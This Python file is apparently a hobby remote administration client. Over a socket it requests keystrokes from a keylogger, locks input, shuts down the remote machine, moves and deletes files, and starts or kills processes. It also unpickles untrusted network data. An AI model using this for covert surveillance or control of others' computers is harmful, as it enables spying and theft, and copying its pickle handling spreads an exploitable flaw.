import socket
import time
import threading
import struct
import pickle
from task_manager import process_opcode
from file_management import *
from keylogger import create_file_logger

BUF_SIZE = 256
class SocketClient:
    def __init__(self):
        """
        Creates a new instance of StreamingClient.

        Parameters
        ----------

        host : str
            host address to connect to
        port : int
            port to connect to
        """
        self.running = False
        self.__lock = threading.Lock()
        self.__keylogger = None
        self.__client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
    def __clean(self):
        self.running = False
        return None

    def __request(self, event, data = None):
        """
        Handles the individual server connections and processes their stream data.
        """
        try:
            # send request to server
            msg = pickle.dumps([event, data])
            size = len(msg)
            self.__client_socket.sendall(struct.pack('>L', size) + msg)
            
            # receive response from server
            # size of message
            payload_size = struct.calcsize('>L')
            packed_msg_size = self.__client_socket.recv(payload_size)
            if packed_msg_size == b'' or not self.running:
                return self.__clean()

            data = b""
            msg_size = struct.unpack(">L", packed_msg_size)[0]
            size = msg_size
            
            # message content
            while size > 0:
                data += self.__client_socket.recv(min(size, BUF_SIZE))
                size = msg_size - len(data)
            return pickle.loads(data)
        except ConnectionResetError:
            return self.__clean()
        except ConnectionAbortedError:
            return self.__clean()
        except BrokenPipeError:
            return self.__clean()
        except OSError:
            return self.__clean
            
    def disconnect(self):
        """
        Stops client stream if running
        """
        self.__lock.acquire()
        if self.running:
            self.__client_socket.close()
            self.running = False
        self.__lock.release()
        
    def connect(self, host, port):
        try:
            self.__client_socket.connect((host, port))
            self.running = True
            return True
        except ConnectionRefusedError:
            return False
    
    def request_mac(self):
        return self.__request('request_mac')
    
    def request_key(self):
        return self.__request('request_key')
            
    def stop_keyhook(self):
        return self.__request('stop_key')
        
    def logout(self):
        return self.__request("logout")
        
    def shutdown(self):
        return self.__request("shutdown")
        
    def control_input(self, is_lock = True):
        return self.__request("control_input", {"is_lock": is_lock})
        
    def request_listdir(self, root_path):
        return self.__request("file_management", 
                              {"opcode": file_opcode.LISTDIR, "path": root_path})
    
    def send_file(self, client_path, server_path):
        with open(client_path, "rb") as f:
            file_content = f.read()
        return self.__request("file_management", 
                            {"opcode": file_opcode.PASTEFILE, 
                            "file_content": file_content, 
                            "path": server_path})
        
    def get_file(self, client_path, server_path):
        data = self.__request("file_management", 
                            {"opcode": file_opcode.COPYFILE, "path": server_path})
        if (data is None): return None
        with open(client_path, "wb") as f:
            f.write(data)
        return b""
        
    def del_file(self, path):
        return self.__request("file_management", 
                            {"opcode": file_opcode.DELFILE, "path": path})
    
    def request_list_process(self):
        return self.__request("process_management", 
                       {"opcode": process_opcode.LISTPROC})
    
    def start_process(self, name):
        return self.__request("process_management", 
                       {"opcode": process_opcode.STARTPROC, "name": name})
    
    def kill_process(self, pid):
        return self.__request("process_management", 
                       {"opcode": process_opcode.KILLPROC, "pid": pid})
    
    def request_list_app(self):
        return self.__request("process_management", 
                       {"opcode": process_opcode.LISTAPP})
        
    def start_app(self, app_id):
        return self.__request("process_management", 
                       {"opcode": process_opcode.STARTAPP, "app_id": app_id})
        
if __name__ == "__main__":
    client = SocketClient()
    client.connect('127.0.0.1', 26100)
    # nics = client.request_mac()
    # for nic in nics:
    #     print(nic)
    # def keyhook_loop():
    #     while not threading.current_thread().is_stopped():
    #         data = client.request_key()
    #         if data is None:
    #             return
    #         print(data) # write new data to file
    #         time.sleep(0.1)
    
    # keylogger = stoppabe_thread(target=keyhook_loop, args=[], daemon=True)
    
    # keylogger.start()
    # time.sleep(10)
    # keylogger.stop()
    # client.stop_keyhook()
    # procs = client.request_list_process()
    # for proc in procs:
    #     if proc["is_app"]:
    #         print(proc)
            
    # client.start_process("dxdiag")
    # client.kill_process(11380)
    
    # apps = client.request_list_app()
    # for app in apps:
    #     print(app)
    # client.start_app(apps[0]["AppID"])
    client.get_file('E:\\abc.txt', 'C:\\Garena\\hehe.txt')
    # files = client.request_listdir("E:\\")
    # for file in files["content"]:
    #     print(file["Filename"], file["Filetype"], file["Filesize"], file["Last modified"])
